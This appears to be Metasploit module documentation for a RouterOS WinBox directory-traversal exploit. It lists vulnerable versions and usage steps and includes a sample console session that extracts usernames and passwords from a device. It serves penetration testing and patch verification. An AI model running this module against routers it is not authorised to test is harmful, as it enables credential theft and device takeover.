## Vulnerable Application

MikroTik RouterOS allows unauthenticated remote attackers to read arbitrary files
through a directory traversal through the WinBox interface (typically port 8291).

Vulnerable versions of MikroTik RouterOS:

* (bugfix) 6.30.1-6.40.7
* (current) 6.29-6.42
* (RC) 6.29rc1-6.43rc3

MikroTik images can be downloaded from [here](https://mikrotik.com/download/archive)

### Adding Users

To add users to the MikroTik device, use the following commands:

Get the groups first

```
/user group print
```

Add a user

```
/user add name=[name] password=[password] group=[group]
```

## Verification Steps

1. Start msfconsole
1. Do: `use auxiliary/gather/mikrotik_winbox_fileread`
1. Do: `set rhosts [IP]`
1. Do: `run`
1. You should credentials.

## Options

## Scenarios

### Mikrotik Cloud Router RouterOS 6.40.4

```
msf5 > use auxiliary/gather/mikrotik_winbox_fileread 
msf5 auxiliary(gather/mikrotik_winbox_fileread) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf5 auxiliary(gather/mikrotik_winbox_fileread) > run

[*] Running for 1.1.1.1...
[*] 1.1.1.1 - Session ID: 54
[*] 1.1.1.1 - Requesting user database through exploit
[*] 1.1.1.1 - Exploit successful, attempting to extract usernames & passwords
[*] 1.1.1.1 - Extracted Username: "write" and password "write"
[*] 1.1.1.1 - Extracted Username: "read" and password "read"
[*] 1.1.1.1 - Extracted Username: "admin" and password ""
[*] 1.1.1.1 - Extracted Username: "user2" and password "password1"
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
